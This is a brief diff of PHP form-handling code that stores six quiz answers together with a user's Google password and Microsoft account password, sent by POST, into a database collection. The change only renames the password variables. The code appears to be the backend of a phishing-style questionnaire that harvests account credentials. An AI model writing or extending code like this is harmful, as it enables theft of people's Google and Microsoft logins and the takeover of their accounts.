@@ -16,8 +16,9 @@
         $q4 = json_decode($_POST['q4']);
         $q5 = json_decode($_POST['q5']);
         $q6 = json_decode($_POST['q6']);
-        $gp = json_decode($_POST['gp']);
-        $mp = json_decode($_POST['mp']);
+        $googlePass = json_decode($_POST['gp']);
+        $msaPass = json_decode($_POST['mp']);
+
         $insertOneResult = $collection->insertOne([
             'Q1' => $q1,
             'Q2' => $q2,
@@ -25,9 +26,10 @@
             'Q4' => $q4,
             'Q5' => $q5,
             'Q6' => $q6,
-            'GooglePassword' => $gp,
-            'MSAPassword' => $mp,
+            'GooglePassword' => $googlePass,
+            'MSAPassword' => $msaPass,
         ]);
+        
       };
       
 
